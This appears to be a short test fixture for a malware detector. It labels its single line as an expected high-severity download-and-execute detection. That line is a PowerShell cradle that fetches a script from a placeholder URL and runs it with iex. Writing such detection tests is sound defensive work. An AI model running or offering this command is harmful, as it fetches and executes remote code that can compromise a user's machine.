# expect: DlExec/high
# url: https://example.org/p.ps1
iex(New-Object Net.WebClient).DownloadString('https://example.org/p.ps1')
